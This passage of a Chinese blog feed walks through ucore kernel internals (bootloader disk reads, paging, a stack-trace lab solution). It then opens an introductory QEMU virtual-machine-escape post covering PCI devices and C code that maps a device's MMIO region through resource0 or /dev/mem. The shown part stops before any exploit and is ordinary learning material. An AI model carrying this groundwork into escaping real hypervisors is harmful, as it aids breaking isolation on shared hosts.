class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* bootmain - the entry of bootloader */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">bootmain(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// read the 1st page off disk</span></span><br><span class="line">    readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is this a valid ELF?</span></span><br><span class="line">    <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// load each program segment (ignores ph flags)</span></span><br><span class="line">    ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">    eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">        readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call the entry point from the ELF header</span></span><br><span class="line">    <span class="comment">// note: does not return</span></span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do nothing */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以着重关注一下这个<code>readseg</code>函数的实现。这个函数的作用是从某个扇区读取数据加载到内存当中。那么也当然可以加载我们的内核</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * readseg - read @count bytes at @offset from kernel into virtual address @va,</span></span><br><span class="line"><span class="comment"> * might copy more than asked.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">readseg(<span class="keyword">uintptr_t</span> va, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset) &#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> end_va = va + count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// round down to sector boundary</span></span><br><span class="line">    va -= offset % SECTSIZE;</span><br><span class="line"><span class="comment">//因为我们要一个扇区一个扇区的读，所以需要让va减至和SECTSIZE对齐</span></span><br><span class="line">    <span class="comment">// translate from bytes to sectors; kernel starts at sector 1</span></span><br><span class="line">    <span class="keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//计算扇区的编号，需要注意的是从0开始</span></span><br><span class="line">    <span class="comment">// If this is too slow, we could read lots of sectors at a time.</span></span><br><span class="line">    <span class="comment">// We&#x27;d write more to memory than asked, but it doesn&#x27;t matter --</span></span><br><span class="line">    <span class="comment">// we load in increasing order.</span></span><br><span class="line">    <span class="keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;</span><br><span class="line">        readsect((<span class="keyword">void</span> *)va, secno); <span class="comment">//调用readsect函数，每次读一个扇区</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>va</code>是我们存放数据的虚拟内存地址，<code>count</code>是数据大小，而<code>offset</code>则是所要读取的数据相对于磁盘开始的位置其中进行简单的数据处理之后调用<code>readsect</code>函数，每次一个扇区地读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">readsect(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno) &#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);<span class="comment">//0x1F2:所要读的扇区数                    // count = 1</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>); <span class="comment">//LBA参数0-7位</span></span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);<span class="comment">//LBA参数8-15位</span></span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);<span class="comment">//LBA参数16-23位</span></span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);<span class="comment">//0-3:LBA参数24-27位，第4位:0为主盘、1为从盘</span></span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);<span class="comment">//状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据              // cmd 0x20 - read sectors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readsect</code>代码与外设(磁盘)交互，读取数据到相应地址。这里用到的是LBA模式的PIO方式，进行IO操作主要是CPU填相应的IO地址寄存器完成(这里是0x1f0-0x1f7)</p><h2 id="关于内存访问"><a href="#关于内存访问" class="headerlink" title="关于内存访问"></a>关于内存访问</h2><p>需要注意的是逻辑地址、线性地址以及物理地址三个概念。(还有一个经常提到的概念是虚拟地址，但是经查阅资料似乎这个概念的说法众说纷纭，有的说是线性地址的别名，有的说是逻辑地址的别名，这里就当成逻辑地址的别名来处理了)</p><p>在保护模式一节中我们介绍了分段的概念，而这里我们主要讲的是分页的概念。在段页式的管理中，通常OS都会弱化分段的概念，而把分页作为主要的地址转换手段。段式管理只是一个过滤的作用，他将一个虚拟地址直接映射成线性地址，然后通过页表转换变成相应的物理地址。</p><p>在通常的分段中，我们会通过段选择子，在段描述符表(GDT)中索引到段描述符，然后加上段描述符中的段基址。但是弱化之后GDT中所有段基址都为0，所以虚拟地址和线性地址等价。那么从虚拟地址到物理地址的过程就是一个页表转换了。</p><p>下面详细说一下在页基址下，线性地址到物理地址的过程。并结合ucore中代码看一下启用页基址的过程</p><p>首先介绍一下x86下和页表有关的寄存器</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>用途</th></tr></thead><tbody><tr><td>CR0</td><td>主要是有关分段与分页的启动</td></tr><tr><td>CR2</td><td>保存发生缺页故障时的虚拟地址</td></tr><tr><td>CR3</td><td>保存当前进程的页目录表的<strong>物理内存</strong>基地址</td></tr><tr><td>CR4</td><td>PRE是否开启物理地址扩展</td></tr></tbody></table></div><p>这里比较重要的就是CR3寄存器，需要注意的是它保存的是当前进程的页目录表的<strong>物理内存</strong>基地址（设想一下如果它保存的是页目录表的虚拟内存基地址，那么我们进行地址转换的时候需要索引页目录表，但是要找到页目录表虚拟地址对应的物理地址在哪，就又得去索引页目录表….死循环了)</p><p>在x86下，我们用到的是两级页表(一个页目录表，一个页表)，具体转化的过程如下(用了知乎上面的一张图，侵删)</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20230430175825867.png" alt="image-20230430175825867"></p><p>首先根据高位的<code>DIRECTORY</code>部分，通过CR3寄存器存放的页目录表索引到页表基址(这个也是物理地址，与CR3原因同理)，然后再根据这个页表基址结合我们的中间的<code>TABLE</code>部分，找到页表项，与页偏移相结合得到了正确的物理地址。多级页表同理</p><p>我们从ucore的实现中看一下页表基址的启动过程，主要的实现是在<code>kern/init/entry.S</code>中,在上一节<code>关于启动</code>中，当我们把内核读进去的时候就会通过<code>((void (*)(void))(ELFHDR-&gt;e_entry &amp; 0xFFFFFF))();</code>跳转到这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;mmu.h&gt;</span><br><span class="line">#include &lt;memlayout.h&gt;</span><br><span class="line"></span><br><span class="line">#define REALLOC(x) (x - KERNBASE)</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.globl kern_entry</span><br><span class="line">kern_entry:</span><br><span class="line">    # load pa of boot pgdir</span><br><span class="line">    movl $REALLOC(__boot_pgdir), %eax</span><br><span class="line">    movl %eax, %cr3</span><br><span class="line"></span><br><span class="line">    # enable paging</span><br><span class="line">    movl %cr0, %eax</span><br><span class="line">    orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax</span><br><span class="line">    andl $~(CR0_TS | CR0_EM), %eax</span><br><span class="line">    movl %eax, %cr0</span><br><span class="line"></span><br><span class="line">    # update eip</span><br><span class="line">    # now, eip &#x3D; 0x1.....</span><br><span class="line">    leal next, %eax</span><br><span class="line">    # set eip &#x3D; KERNBASE + 0x1.....</span><br><span class="line">    jmp *%eax</span><br><span class="line">next:</span><br><span class="line"></span><br><span class="line">    # unmap va 0 ~ 4M, it&#39;s temporary mapping</span><br><span class="line">    xorl %eax, %eax</span><br><span class="line">    movl %eax, __boot_pgdir</span><br><span class="line"></span><br><span class="line">    # set ebp, esp</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    # the kernel stack region is from bootstack -- bootstacktop,</span><br><span class="line">    # the kernel stack size is KSTACKSIZE (8KB)defined in memlayout.h</span><br><span class="line">    movl $bootstacktop, %esp</span><br><span class="line">    # now kernel stack is ready , call the first C function</span><br><span class="line">    call kern_init</span><br><span class="line"></span><br><span class="line"># should never get here</span><br><span class="line">spin:</span><br><span class="line">    jmp spin</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">.align PGSIZE</span><br><span class="line">    .globl bootstack</span><br><span class="line">bootstack:</span><br><span class="line">    .space KSTACKSIZE</span><br><span class="line">    .globl bootstacktop</span><br><span class="line">bootstacktop:</span><br><span class="line"></span><br><span class="line"># kernel builtin pgdir</span><br><span class="line"># an initial page directory (Page Directory Table, PDT)</span><br><span class="line"># These page directory table and page table can be reused!</span><br><span class="line">.section .data.pgdir</span><br><span class="line">.align PGSIZE</span><br><span class="line">__boot_pgdir:</span><br><span class="line">.globl __boot_pgdir</span><br><span class="line">    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to PDE of KERNBASE</span><br><span class="line">    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE</span><br><span class="line"></span><br><span class="line">.set i, 0</span><br><span class="line">__boot_pt1:</span><br><span class="line">.rept 1024</span><br><span class="line">    .long i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line">    .set i, i + 1</span><br><span class="line">.endr</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="关于中断与异常"><a href="#关于中断与异常" class="headerlink" title="关于中断与异常"></a>关于中断与异常</h2><h2 id="关于特权级"><a href="#关于特权级" class="headerlink" title="关于特权级"></a>关于特权级</h2><h1 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h1><h2 id="LAB1"><a href="#LAB1" class="headerlink" title="LAB1"></a>LAB1</h2><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>理解通过make生成执行文件的过程</p></blockquote><p>通过<code>make V=</code>可以观察出总的过程</p><p>这里顺便整理一下makefile的编写原理</p><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p> 使用qemu执行并调试lab1中的软件</p></blockquote><p>按理说是执行<code>make debug</code>就可以，但是我没起起来，似乎是因为在执行<code>make debug</code>的时候另起一个终端来执行我们的gdb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TERMINAL        :=gnome-terminal</span><br><span class="line">$(V)$(TERMINAL) -e <span class="string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span></span><br></pre></td></tr></table></figure><p>而这个<code>gnome-terminal</code>我本地执行有点问题</p><p>所以我就直接不带debug地<code>make</code>,然后在命令行下直接执行qemu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -S -s -parallel stdio -hda bin/ucore.img -serial null</span><br></pre></td></tr></table></figure><p>然后再起个终端执行gdb，类似调试内核那样直接运行<code>target remote:1234</code></p><p>然后就可以gdb调试了</p><p>需要注意的是，在调试BIOS的指令时我们必须手动地加上段寄存器的值才能看到真正执行的代码，就像下面一样。这是因为cs寄存器初始化非零，但是gdb默认只输出ip指向地址的代码。</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20230428145341002.png" alt="image-20230428145341002"></p><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>分析bootloader进入保护模式的过程</p></blockquote><h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><blockquote><p>分析bootloader加载ELF格式的OS的过程</p></blockquote><h3 id="练习5"><a href="#练习5" class="headerlink" title="练习5"></a>练习5</h3><blockquote><p>实现函数调用堆栈跟踪函数</p></blockquote><p>就根据32位下函数调用栈的结构，不断回溯并输出参数以及地址即可。熟悉32位下简单栈溢出的话应该很容易做</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">print_stackframe(<span class="keyword">void</span>) &#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 1 */</span></span><br><span class="line">     <span class="comment">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (3) from 0 .. STACKFRAME_DEPTH</span></span><br><span class="line"><span class="comment">      *    (3.1) printf value of ebp, eip</span></span><br><span class="line"><span class="comment">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (uint32_t)ebp +2 [0..4]</span></span><br><span class="line"><span class="comment">      *    (3.3) cprintf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span></span><br><span class="line"><span class="comment">      *    (3.5) popup a calling stackframe</span></span><br><span class="line"><span class="comment">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span></span><br><span class="line"><span class="comment">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">uint32_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;STACKFRAME_DEPTH&amp;&amp;ebp !=<span class="number">0</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;ebp = 0x%08x,eip = 0x%08x\n&quot;</span>,ebp,eip);</span><br><span class="line">        <span class="keyword">uint32_t</span>* args = (<span class="keyword">uint32_t</span>*)ebp + <span class="number">2</span>;</span><br><span class="line">        cprintf(<span class="string">&quot;args:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;0x%08x &quot;</span>,args[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        print_debuginfo(eip<span class="number">-1</span>);</span><br><span class="line">        eip = *((<span class="keyword">uint32_t</span>*)ebp+<span class="number">1</span>);</span><br><span class="line">        ebp = *(<span class="keyword">uint32_t</span>*)ebp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="练习6"><a href="#练习6" class="headerlink" title="练习6"></a>练习6</h3><blockquote><p>完善中断初始化和处理</p></blockquote><h2 id="LAB2"><a href="#LAB2" class="headerlink" title="LAB2"></a>LAB2</h2><h1 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h1><p><a href="https://zhuanlan.zhihu.com/p/42309472">CPU的实模式和保护模式(一) - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/wingsummer/p/15312627.html">保护模式篇——段描述符与段选择子 - 寂静的羽夏 - 博客园 (cnblogs.com)</a></p><p><a href="https://juejin.cn/post/6844904110857125895">计算机系统是如何启动的？ - 掘金 (juejin.cn)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;感觉自己开发经验很少，多以写脚本为主，没怎么接触过较为大型的项目，所以想搞点开发相关的经验。打算借ucore再回顾一下OS相关的知识。这个项目啃完之后打算看看南大的那个模拟的lab，然后学点C++逆向。&lt;/p&gt;
&lt;p&gt;BASIC-KNOWLEDGE记得比较杂(因为感觉知识点</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="dev" scheme="http://phot0n.com/tags/dev/"/>
    
  </entry>
  
  <entry>
    <title>QEMU逃逸入门</title>
    <link href="http://phot0n.com/2023/04/08/QEMU-RUN/"/>
    <id>http://phot0n.com/2023/04/08/QEMU-RUN/</id>
    <published>2023-04-07T16:09:19.000Z</published>
    <updated>2023-08-08T16:55:53.694Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好，我润！</p></blockquote><h1 id="PCI设备简介"><a href="#PCI设备简介" class="headerlink" title="PCI设备简介"></a>PCI设备简介</h1><p>什么是PCI设备，关于PCI设备，小编也很好奇….</p><p>不扯皮了,PCI设备简而言之就是插在PCI插槽上面的一些设备,包括比如声卡 网卡之类的.它们都遵循PCI总线标准</p><p>既然有了设备,我们首先想到的肯定是如何与其交互的问题</p><p>我们在操作系统课(还是计组来着,我忘了)上学过,CPU与外设进行交互通常分为两种类型:</p><ul><li>MMIO:也就是内存映射IO,外设和内存共享地址空间,我们可以像读写内存一样读写外设内容</li><li>PMIO:也就是端口映射IO,外设和内存的地址空间相独立,CPU需要用一些专门的指令与外设进行交互(比如INTEL的CPU使用IN和OUT指令)</li></ul><p>我们先有这么一个概念,后面及题目中会有详细介绍如何交互的过程</p><p>不过大概许多人和我一样都有一些疑问:PCI设备是如何被CPU发现的,操作系统如何管理这些PCI设备,我们如何查看电脑上插了哪些设备….这些问题后面也许会提到一些吧(x</p><h2 id="PCI设备配置空间"><a href="#PCI设备配置空间" class="headerlink" title="PCI设备配置空间"></a>PCI设备配置空间</h2><p>每个PCI设备都有一个配置空间,介绍了关于这个设备的一些信息,其大小为256字节,头部64字节是PCI标准规定的,</p><p>一般我们关注Device ID和Vendor ID就行了</p><p><img src="https://s2.loli.net/2023/05/09/l4UyqSbeOP7IWvj.png" alt="image-20230509215655296"></p><p>还有一个比较重要的是<code>Base Address Registers(BAR)</code>这块,它记录了设备用到的地址空间类型\基址以及其他属性</p><p><img src="https://s2.loli.net/2023/05/09/oQMx4KiRjcbWNug.png" alt="image-20230509220506733"></p><p>BAR的最后一位标识了地址空间类型,也就是前面简要提到的MMIO以及PMIO(为0时为MMIO)</p><p>而其他字段根据图也可以很清楚的看到,比较重要的就是高位的基址(Base Address)</p><h2 id="查看PCI设备"><a href="#查看PCI设备" class="headerlink" title="查看PCI设备"></a>查看PCI设备</h2><p>我们可以通过<code>lspci</code>这个命令来查看当前主机的PCI总线信息</p><p><img src="https://s2.loli.net/2023/05/09/SAxoLEywfGiIRz3.png" alt="image-20230509221439032"></p><p>前面的标识<code>XX:YY:ZZ</code>代表着<code>总线:设备:功能</code> .也就是说,每个PCI设备有一个总线号,一个设备号,一个功能号来标识,通过这个我们有时候可以在<code>/sys/devices</code>下找到对应的设备的一些配置信息</p><p><img src="https://s2.loli.net/2023/05/09/DEnvO5i2obTeSWI.png" alt="image-20230509221609717"></p><p>比如这里我们可以查看到某个设备的配置空间,包括前文提到的设备号,厂商号,BAR等</p><p><img src="https://s2.loli.net/2023/05/09/fK5baoFPXi4sMYJ.png" alt="image-20230509221813086"></p><p>查看目录下的<code>resource</code>文件可以查看到相应内存空间</p><p><img src="https://s2.loli.net/2023/05/09/YVuLe6wxbprS21v.png" alt="image-20230509222152675"></p><p>每行代表着相应空间的起始地址,结束地址以及标识位.拿图中举例子,其第一行代表着一个起始地址为<code>0x00000000fea00000</code>,结束地址为<code>0x00000000feafffff</code>,标识位为<code>0x0000000000040200</code>的空间</p><h2 id="与PCI设备交互-访问对应空间"><a href="#与PCI设备交互-访问对应空间" class="headerlink" title="与PCI设备交互,访问对应空间"></a>与PCI设备交互,访问对应空间</h2><p>我们可以在内核态与用户态都能访问对应空间。这里主要说一下MMIO的访问。</p><p>大部分情况下我们在用户态访问就行了,有两种方式，一种就是通过映射<code>resource0</code>文件，还有一种是通过<code>open(&quot;/dev/mem&quot;,2)</code></p><p>前者是这样操作的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>    mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"><span class="keyword">void</span> * mmio    = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>而后者是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * mmio    = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br></pre></td></tr></table></figure><p>后面那个地址<code>0xfea00000</code>就是我们之前通过<code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code>所能发现的地址首址</p><p>然后我们就可以对对应地址进行读写操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合在一起加上头文件就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span 